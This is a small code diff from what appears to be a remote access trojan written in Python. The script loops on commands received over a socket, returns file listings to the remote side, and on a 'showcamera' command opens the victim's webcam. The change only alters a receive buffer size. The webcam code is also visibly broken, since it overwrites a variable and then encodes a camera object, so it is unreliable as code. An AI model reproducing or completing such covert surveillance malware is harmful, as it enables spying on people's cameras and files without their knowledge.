@@ -33,6 +33,6 @@ while True:
         sock.send(str(files).encode())
     
     if command == "showcamera":
-        cap = sock.recv(1004).decode()
+        cap = sock.recv(64).decode()
         cap = cv2.VideoCapture(0)
         sock.send(cap.encode())
